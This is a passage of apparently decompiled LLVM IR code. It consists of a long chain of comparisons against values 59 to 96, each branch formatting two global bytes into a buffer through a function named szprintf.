  %v3_b3dc = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b3e8 = sext i8 %v3_b3d0 to i32
  %v6_b3e8 = sext i8 %v3_b3dc to i32
  %v8_b3e8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c734.185 to i32), i32 %v4_b3e8, i32 %v6_b3e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3ec

dec_label_pc_b3ec:                                ; preds = %dec_label_pc_b3b8, %dec_label_pc_b3c4
  %v7_b3f0 = icmp eq i32 %v2_a7e4, 59
  br i1 %v7_b3f0, label %dec_label_pc_b3f8, label %dec_label_pc_b420

dec_label_pc_b3f8:                                ; preds = %dec_label_pc_b3ec
  %v3_b404 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b410 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b41c = sext i8 %v3_b404 to i32
  %v6_b41c = sext i8 %v3_b410 to i32
  %v8_b41c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c744.187 to i32), i32 %v4_b41c, i32 %v6_b41c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b420

dec_label_pc_b420:                                ; preds = %dec_label_pc_b3ec, %dec_label_pc_b3f8
  %v7_b424 = icmp eq i32 %v2_a7e4, 60
  br i1 %v7_b424, label %dec_label_pc_b42c, label %dec_label_pc_b454

dec_label_pc_b42c:                                ; preds = %dec_label_pc_b420
  %v3_b438 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b444 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b450 = sext i8 %v3_b438 to i32
  %v6_b450 = sext i8 %v3_b444 to i32
  %v8_b450 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c754.189 to i32), i32 %v4_b450, i32 %v6_b450, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b454

dec_label_pc_b454:                                ; preds = %dec_label_pc_b420, %dec_label_pc_b42c
  %v7_b458 = icmp eq i32 %v2_a7e4, 61
  br i1 %v7_b458, label %dec_label_pc_b460, label %dec_label_pc_b488

dec_label_pc_b460:                                ; preds = %dec_label_pc_b454
  %v3_b46c = load i8, i8* @global_var_28c59.70, align 1
  %v3_b478 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b484 = sext i8 %v3_b46c to i32
  %v6_b484 = sext i8 %v3_b478 to i32
  %v8_b484 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c764.191 to i32), i32 %v4_b484, i32 %v6_b484, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b488

dec_label_pc_b488:                                ; preds = %dec_label_pc_b454, %dec_label_pc_b460
  %v7_b48c = icmp eq i32 %v2_a7e4, 62
  br i1 %v7_b48c, label %dec_label_pc_b494, label %dec_label_pc_b4bc

dec_label_pc_b494:                                ; preds = %dec_label_pc_b488
  %v3_b4a0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b4ac = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b4b8 = sext i8 %v3_b4a0 to i32
  %v6_b4b8 = sext i8 %v3_b4ac to i32
  %v8_b4b8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c774.193 to i32), i32 %v4_b4b8, i32 %v6_b4b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4bc

dec_label_pc_b4bc:                                ; preds = %dec_label_pc_b488, %dec_label_pc_b494
  %v7_b4c0 = icmp eq i32 %v2_a7e4, 63
  br i1 %v7_b4c0, label %dec_label_pc_b4c8, label %dec_label_pc_b4f0

dec_label_pc_b4c8:                                ; preds = %dec_label_pc_b4bc
  %v3_b4d4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b4e0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b4ec = sext i8 %v3_b4d4 to i32
  %v6_b4ec = sext i8 %v3_b4e0 to i32
  %v8_b4ec = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c784.195 to i32), i32 %v4_b4ec, i32 %v6_b4ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4f0

dec_label_pc_b4f0:                                ; preds = %dec_label_pc_b4bc, %dec_label_pc_b4c8
  %v7_b4f4 = icmp eq i32 %v2_a7e4, 64
  br i1 %v7_b4f4, label %dec_label_pc_b4fc, label %dec_label_pc_b524

dec_label_pc_b4fc:                                ; preds = %dec_label_pc_b4f0
  %v3_b508 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b514 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b520 = sext i8 %v3_b508 to i32
  %v6_b520 = sext i8 %v3_b514 to i32
  %v8_b520 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c794.197 to i32), i32 %v4_b520, i32 %v6_b520, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b524

dec_label_pc_b524:                                ; preds = %dec_label_pc_b4f0, %dec_label_pc_b4fc
  %v7_b528 = icmp eq i32 %v2_a7e4, 65
  br i1 %v7_b528, label %dec_label_pc_b530, label %dec_label_pc_b558

dec_label_pc_b530:                                ; preds = %dec_label_pc_b524
  %v3_b53c = load i8, i8* @global_var_28c59.70, align 1
  %v3_b548 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b554 = sext i8 %v3_b53c to i32
  %v6_b554 = sext i8 %v3_b548 to i32
  %v8_b554 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c7a4.199 to i32), i32 %v4_b554, i32 %v6_b554, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b558

dec_label_pc_b558:                                ; preds = %dec_label_pc_b524, %dec_label_pc_b530
  %v7_b55c = icmp eq i32 %v2_a7e4, 66
  br i1 %v7_b55c, label %dec_label_pc_b564, label %dec_label_pc_b58c

dec_label_pc_b564:                                ; preds = %dec_label_pc_b558
  %v3_b570 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b57c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b588 = sext i8 %v3_b570 to i32
  %v6_b588 = sext i8 %v3_b57c to i32
  %v8_b588 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c7b4.201 to i32), i32 %v4_b588, i32 %v6_b588, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b58c

dec_label_pc_b58c:                                ; preds = %dec_label_pc_b558, %dec_label_pc_b564
  %v7_b590 = icmp eq i32 %v2_a7e4, 67
  br i1 %v7_b590, label %dec_label_pc_b598, label %dec_label_pc_b5c0

dec_label_pc_b598:                                ; preds = %dec_label_pc_b58c
  %v3_b5a4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b5b0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b5bc = sext i8 %v3_b5a4 to i32
  %v6_b5bc = sext i8 %v3_b5b0 to i32
  %v8_b5bc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c7c4.203 to i32), i32 %v4_b5bc, i32 %v6_b5bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5c0

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b58c, %dec_label_pc_b598
  %v7_b5c4 = icmp eq i32 %v2_a7e4, 68
  br i1 %v7_b5c4, label %dec_label_pc_b5cc, label %dec_label_pc_b5f4

dec_label_pc_b5cc:                                ; preds = %dec_label_pc_b5c0
  %v3_b5d8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b5e4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b5f0 = sext i8 %v3_b5d8 to i32
  %v6_b5f0 = sext i8 %v3_b5e4 to i32
  %v8_b5f0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c7d4.205 to i32), i32 %v4_b5f0, i32 %v6_b5f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5f4

dec_label_pc_b5f4:                                ; preds = %dec_label_pc_b5c0, %dec_label_pc_b5cc
  %v7_b5f8 = icmp eq i32 %v2_a7e4, 69
  br i1 %v7_b5f8, label %dec_label_pc_b600, label %dec_label_pc_b628

dec_label_pc_b600:                                ; preds = %dec_label_pc_b5f4
  %v3_b60c = load i8, i8* @global_var_28c59.70, align 1
  %v3_b618 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b624 = sext i8 %v3_b60c to i32
  %v6_b624 = sext i8 %v3_b618 to i32
  %v8_b624 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c7e4.207 to i32), i32 %v4_b624, i32 %v6_b624, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b628

dec_label_pc_b628:                                ; preds = %dec_label_pc_b5f4, %dec_label_pc_b600
  %v7_b62c = icmp eq i32 %v2_a7e4, 70
  br i1 %v7_b62c, label %dec_label_pc_b634, label %dec_label_pc_b65c

dec_label_pc_b634:                                ; preds = %dec_label_pc_b628
  %v3_b640 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b64c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b658 = sext i8 %v3_b640 to i32
  %v6_b658 = sext i8 %v3_b64c to i32
  %v8_b658 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c7f4.209 to i32), i32 %v4_b658, i32 %v6_b658, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b65c

dec_label_pc_b65c:                                ; preds = %dec_label_pc_b628, %dec_label_pc_b634
  %v7_b660 = icmp eq i32 %v2_a7e4, 71
  br i1 %v7_b660, label %dec_label_pc_b668, label %dec_label_pc_b690

dec_label_pc_b668:                                ; preds = %dec_label_pc_b65c
  %v3_b674 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b680 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b68c = sext i8 %v3_b674 to i32
  %v6_b68c = sext i8 %v3_b680 to i32
  %v8_b68c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c804.211 to i32), i32 %v4_b68c, i32 %v6_b68c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b690

dec_label_pc_b690:                                ; preds = %dec_label_pc_b65c, %dec_label_pc_b668
  %v7_b694 = icmp eq i32 %v2_a7e4, 72
  br i1 %v7_b694, label %dec_label_pc_b69c, label %dec_label_pc_b6c4

dec_label_pc_b69c:                                ; preds = %dec_label_pc_b690
  %v3_b6a8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b6b4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b6c0 = sext i8 %v3_b6a8 to i32
  %v6_b6c0 = sext i8 %v3_b6b4 to i32
  %v8_b6c0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c814.213 to i32), i32 %v4_b6c0, i32 %v6_b6c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b6c4

dec_label_pc_b6c4:                                ; preds = %dec_label_pc_b690, %dec_label_pc_b69c
  %v7_b6c8 = icmp eq i32 %v2_a7e4, 73
  br i1 %v7_b6c8, label %dec_label_pc_b6d0, label %dec_label_pc_b948

dec_label_pc_b6d0:                                ; preds = %dec_label_pc_b6c4
  %v3_b6dc = load i8, i8* @global_var_28c59.70, align 1
  %v3_b6e8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b944 = sext i8 %v3_b6dc to i32
  %v6_b944 = sext i8 %v3_b6e8 to i32
  %v8_b944 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c824.215 to i32), i32 %v4_b944, i32 %v6_b944, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b948

dec_label_pc_b948:                                ; preds = %dec_label_pc_b6c4, %dec_label_pc_b6d0
  %v7_b94c = icmp eq i32 %v2_a7e4, 74
  br i1 %v7_b94c, label %dec_label_pc_b954, label %dec_label_pc_b97c

dec_label_pc_b954:                                ; preds = %dec_label_pc_b948
  %v3_b960 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b96c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b978 = sext i8 %v3_b960 to i32
  %v6_b978 = sext i8 %v3_b96c to i32
  %v8_b978 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c834.217 to i32), i32 %v4_b978, i32 %v6_b978, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b97c

dec_label_pc_b97c:                                ; preds = %dec_label_pc_b948, %dec_label_pc_b954
  %v7_b980 = icmp eq i32 %v2_a7e4, 75
  br i1 %v7_b980, label %dec_label_pc_b988, label %dec_label_pc_b9b0

dec_label_pc_b988:                                ; preds = %dec_label_pc_b97c
  %v3_b994 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b9a0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b9ac = sext i8 %v3_b994 to i32
  %v6_b9ac = sext i8 %v3_b9a0 to i32
  %v8_b9ac = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c844.220 to i32), i32 %v4_b9ac, i32 %v6_b9ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9b0

dec_label_pc_b9b0:                                ; preds = %dec_label_pc_b97c, %dec_label_pc_b988
  %v7_b9b4 = icmp eq i32 %v2_a7e4, 76
  br i1 %v7_b9b4, label %dec_label_pc_b9bc, label %dec_label_pc_b9e4

dec_label_pc_b9bc:                                ; preds = %dec_label_pc_b9b0
  %v3_b9c8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_b9d4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_b9e0 = sext i8 %v3_b9c8 to i32
  %v6_b9e0 = sext i8 %v3_b9d4 to i32
  %v8_b9e0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c854.222 to i32), i32 %v4_b9e0, i32 %v6_b9e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b9e4

dec_label_pc_b9e4:                                ; preds = %dec_label_pc_b9b0, %dec_label_pc_b9bc
  %v7_b9e8 = icmp eq i32 %v2_a7e4, 77
  br i1 %v7_b9e8, label %dec_label_pc_b9f0, label %dec_label_pc_ba18

dec_label_pc_b9f0:                                ; preds = %dec_label_pc_b9e4
  %v3_b9fc = load i8, i8* @global_var_28c59.70, align 1
  %v3_ba08 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ba14 = sext i8 %v3_b9fc to i32
  %v6_ba14 = sext i8 %v3_ba08 to i32
  %v8_ba14 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c864.224 to i32), i32 %v4_ba14, i32 %v6_ba14, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba18

dec_label_pc_ba18:                                ; preds = %dec_label_pc_b9e4, %dec_label_pc_b9f0
  %v7_ba1c = icmp eq i32 %v2_a7e4, 78
  br i1 %v7_ba1c, label %dec_label_pc_ba24, label %dec_label_pc_ba4c

dec_label_pc_ba24:                                ; preds = %dec_label_pc_ba18
  %v3_ba30 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ba3c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ba48 = sext i8 %v3_ba30 to i32
  %v6_ba48 = sext i8 %v3_ba3c to i32
  %v8_ba48 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c874.226 to i32), i32 %v4_ba48, i32 %v6_ba48, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba4c

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_ba18, %dec_label_pc_ba24
  %v7_ba50 = icmp eq i32 %v2_a7e4, 79
  br i1 %v7_ba50, label %dec_label_pc_ba58, label %dec_label_pc_ba80

dec_label_pc_ba58:                                ; preds = %dec_label_pc_ba4c
  %v3_ba64 = load i8, i8* @global_var_28c59.70, align 1
  %v3_ba70 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_ba7c = sext i8 %v3_ba64 to i32
  %v6_ba7c = sext i8 %v3_ba70 to i32
  %v8_ba7c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c884.228 to i32), i32 %v4_ba7c, i32 %v6_ba7c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ba80

dec_label_pc_ba80:                                ; preds = %dec_label_pc_ba4c, %dec_label_pc_ba58
  %v7_ba84 = icmp eq i32 %v2_a7e4, 80
  br i1 %v7_ba84, label %dec_label_pc_ba8c, label %dec_label_pc_bab4

dec_label_pc_ba8c:                                ; preds = %dec_label_pc_ba80
  %v3_ba98 = load i8, i8* @global_var_28c59.70, align 1
  %v3_baa4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bab0 = sext i8 %v3_ba98 to i32
  %v6_bab0 = sext i8 %v3_baa4 to i32
  %v8_bab0 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c894.230 to i32), i32 %v4_bab0, i32 %v6_bab0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bab4

dec_label_pc_bab4:                                ; preds = %dec_label_pc_ba80, %dec_label_pc_ba8c
  %v7_bab8 = icmp eq i32 %v2_a7e4, 81
  br i1 %v7_bab8, label %dec_label_pc_bac0, label %dec_label_pc_bae8

dec_label_pc_bac0:                                ; preds = %dec_label_pc_bab4
  %v3_bacc = load i8, i8* @global_var_28c59.70, align 1
  %v3_bad8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bae4 = sext i8 %v3_bacc to i32
  %v6_bae4 = sext i8 %v3_bad8 to i32
  %v8_bae4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c8a4.232 to i32), i32 %v4_bae4, i32 %v6_bae4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bae8

dec_label_pc_bae8:                                ; preds = %dec_label_pc_bab4, %dec_label_pc_bac0
  %v7_baec = icmp eq i32 %v2_a7e4, 82
  br i1 %v7_baec, label %dec_label_pc_baf4, label %dec_label_pc_bb1c

dec_label_pc_baf4:                                ; preds = %dec_label_pc_bae8
  %v3_bb00 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bb0c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bb18 = sext i8 %v3_bb00 to i32
  %v6_bb18 = sext i8 %v3_bb0c to i32
  %v8_bb18 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c8b4.234 to i32), i32 %v4_bb18, i32 %v6_bb18, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb1c

dec_label_pc_bb1c:                                ; preds = %dec_label_pc_bae8, %dec_label_pc_baf4
  %v7_bb20 = icmp eq i32 %v2_a7e4, 83
  br i1 %v7_bb20, label %dec_label_pc_bb28, label %dec_label_pc_bb50

dec_label_pc_bb28:                                ; preds = %dec_label_pc_bb1c
  %v3_bb34 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bb40 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bb4c = sext i8 %v3_bb34 to i32
  %v6_bb4c = sext i8 %v3_bb40 to i32
  %v8_bb4c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c8c4.236 to i32), i32 %v4_bb4c, i32 %v6_bb4c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb50

dec_label_pc_bb50:                                ; preds = %dec_label_pc_bb1c, %dec_label_pc_bb28
  %v7_bb54 = icmp eq i32 %v2_a7e4, 84
  br i1 %v7_bb54, label %dec_label_pc_bb5c, label %dec_label_pc_bb84

dec_label_pc_bb5c:                                ; preds = %dec_label_pc_bb50
  %v3_bb68 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bb74 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bb80 = sext i8 %v3_bb68 to i32
  %v6_bb80 = sext i8 %v3_bb74 to i32
  %v8_bb80 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c8d4.238 to i32), i32 %v4_bb80, i32 %v6_bb80, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bb84

dec_label_pc_bb84:                                ; preds = %dec_label_pc_bb50, %dec_label_pc_bb5c
  %v7_bb88 = icmp eq i32 %v2_a7e4, 85
  br i1 %v7_bb88, label %dec_label_pc_bb90, label %dec_label_pc_bbb8

dec_label_pc_bb90:                                ; preds = %dec_label_pc_bb84
  %v3_bb9c = load i8, i8* @global_var_28c59.70, align 1
  %v3_bba8 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bbb4 = sext i8 %v3_bb9c to i32
  %v6_bbb4 = sext i8 %v3_bba8 to i32
  %v8_bbb4 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c8e4.240 to i32), i32 %v4_bbb4, i32 %v6_bbb4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbb8

dec_label_pc_bbb8:                                ; preds = %dec_label_pc_bb84, %dec_label_pc_bb90
  %v7_bbbc = icmp eq i32 %v2_a7e4, 86
  br i1 %v7_bbbc, label %dec_label_pc_bbc4, label %dec_label_pc_bbec

dec_label_pc_bbc4:                                ; preds = %dec_label_pc_bbb8
  %v3_bbd0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bbdc = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bbe8 = sext i8 %v3_bbd0 to i32
  %v6_bbe8 = sext i8 %v3_bbdc to i32
  %v8_bbe8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c8f4.242 to i32), i32 %v4_bbe8, i32 %v6_bbe8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bbec

dec_label_pc_bbec:                                ; preds = %dec_label_pc_bbb8, %dec_label_pc_bbc4
  %v7_bbf0 = icmp eq i32 %v2_a7e4, 87
  br i1 %v7_bbf0, label %dec_label_pc_bbf8, label %dec_label_pc_bc20

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_bbec
  %v3_bc04 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bc10 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bc1c = sext i8 %v3_bc04 to i32
  %v6_bc1c = sext i8 %v3_bc10 to i32
  %v8_bc1c = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c904.244 to i32), i32 %v4_bc1c, i32 %v6_bc1c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc20

dec_label_pc_bc20:                                ; preds = %dec_label_pc_bbec, %dec_label_pc_bbf8
  %v7_bc24 = icmp eq i32 %v2_a7e4, 88
  br i1 %v7_bc24, label %dec_label_pc_bc2c, label %dec_label_pc_bc54

dec_label_pc_bc2c:                                ; preds = %dec_label_pc_bc20
  %v3_bc38 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bc44 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bc50 = sext i8 %v3_bc38 to i32
  %v6_bc50 = sext i8 %v3_bc44 to i32
  %v8_bc50 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c914.246 to i32), i32 %v4_bc50, i32 %v6_bc50, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc54

dec_label_pc_bc54:                                ; preds = %dec_label_pc_bc20, %dec_label_pc_bc2c
  %v7_bc58 = icmp eq i32 %v2_a7e4, 89
  br i1 %v7_bc58, label %dec_label_pc_bc60, label %dec_label_pc_bc88

dec_label_pc_bc60:                                ; preds = %dec_label_pc_bc54
  %v3_bc6c = load i8, i8* @global_var_28c59.70, align 1
  %v3_bc78 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bc84 = sext i8 %v3_bc6c to i32
  %v6_bc84 = sext i8 %v3_bc78 to i32
  %v8_bc84 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c924.248 to i32), i32 %v4_bc84, i32 %v6_bc84, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bc88

dec_label_pc_bc88:                                ; preds = %dec_label_pc_bc54, %dec_label_pc_bc60
  %v7_bc8c = icmp eq i32 %v2_a7e4, 90
  br i1 %v7_bc8c, label %dec_label_pc_bc94, label %dec_label_pc_bcbc

dec_label_pc_bc94:                                ; preds = %dec_label_pc_bc88
  %v3_bca0 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bcac = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bcb8 = sext i8 %v3_bca0 to i32
  %v6_bcb8 = sext i8 %v3_bcac to i32
  %v8_bcb8 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c934.250 to i32), i32 %v4_bcb8, i32 %v6_bcb8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bcbc

dec_label_pc_bcbc:                                ; preds = %dec_label_pc_bc88, %dec_label_pc_bc94
  %v7_bcc0 = icmp eq i32 %v2_a7e4, 91
  br i1 %v7_bcc0, label %dec_label_pc_bcc8, label %dec_label_pc_bcf0

dec_label_pc_bcc8:                                ; preds = %dec_label_pc_bcbc
  %v3_bcd4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bce0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bcec = sext i8 %v3_bcd4 to i32
  %v6_bcec = sext i8 %v3_bce0 to i32
  %v8_bcec = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c944.252 to i32), i32 %v4_bcec, i32 %v6_bcec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bcf0

dec_label_pc_bcf0:                                ; preds = %dec_label_pc_bcbc, %dec_label_pc_bcc8
  %v7_bcf4 = icmp eq i32 %v2_a7e4, 92
  br i1 %v7_bcf4, label %dec_label_pc_bcfc, label %dec_label_pc_bd24

dec_label_pc_bcfc:                                ; preds = %dec_label_pc_bcf0
  %v3_bd08 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bd14 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bd20 = sext i8 %v3_bd08 to i32
  %v6_bd20 = sext i8 %v3_bd14 to i32
  %v8_bd20 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c954.254 to i32), i32 %v4_bd20, i32 %v6_bd20, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd24

dec_label_pc_bd24:                                ; preds = %dec_label_pc_bcf0, %dec_label_pc_bcfc
  %v7_bd28 = icmp eq i32 %v2_a7e4, 93
  br i1 %v7_bd28, label %dec_label_pc_bd30, label %dec_label_pc_bd58

dec_label_pc_bd30:                                ; preds = %dec_label_pc_bd24
  %v3_bd3c = load i8, i8* @global_var_28c59.70, align 1
  %v3_bd48 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bd54 = sext i8 %v3_bd3c to i32
  %v6_bd54 = sext i8 %v3_bd48 to i32
  %v8_bd54 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c964.256 to i32), i32 %v4_bd54, i32 %v6_bd54, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd58

dec_label_pc_bd58:                                ; preds = %dec_label_pc_bd24, %dec_label_pc_bd30
  %v7_bd5c = icmp eq i32 %v2_a7e4, 94
  br i1 %v7_bd5c, label %dec_label_pc_bd64, label %dec_label_pc_bd8c

dec_label_pc_bd64:                                ; preds = %dec_label_pc_bd58
  %v3_bd70 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bd7c = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bd88 = sext i8 %v3_bd70 to i32
  %v6_bd88 = sext i8 %v3_bd7c to i32
  %v8_bd88 = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c644.155 to i32), i32 %v4_bd88, i32 %v6_bd88, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bd8c

dec_label_pc_bd8c:                                ; preds = %dec_label_pc_bd58, %dec_label_pc_bd64
  %v7_bd90 = icmp eq i32 %v2_a7e4, 95
  br i1 %v7_bd90, label %dec_label_pc_bd98, label %dec_label_pc_bdc0

dec_label_pc_bd98:                                ; preds = %dec_label_pc_bd8c
  %v3_bda4 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bdb0 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bdbc = sext i8 %v3_bda4 to i32
  %v6_bdbc = sext i8 %v3_bdb0 to i32
  %v8_bdbc = call i32 @szprintf(i32 %v2_a710, i32 ptrtoint ([13 x i8]* @global_var_1c974.258 to i32), i32 %v4_bdbc, i32 %v6_bdbc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_bdc0

dec_label_pc_bdc0:                                ; preds = %dec_label_pc_bd8c, %dec_label_pc_bd98
  %v7_bdc4 = icmp eq i32 %v2_a7e4, 96
  br i1 %v7_bdc4, label %dec_label_pc_bdcc, label %dec_label_pc_bdf4

dec_label_pc_bdcc:                                ; preds = %dec_label_pc_bdc0
  %v3_bdd8 = load i8, i8* @global_var_28c59.70, align 1
  %v3_bde4 = load i8, i8* @global_var_28c5a.71, align 1
  %v4_bdf0 = sext i8 %v3_bdd8 to i32
  %v6_bdf0 = sext i8 %v3_bde4 to i32
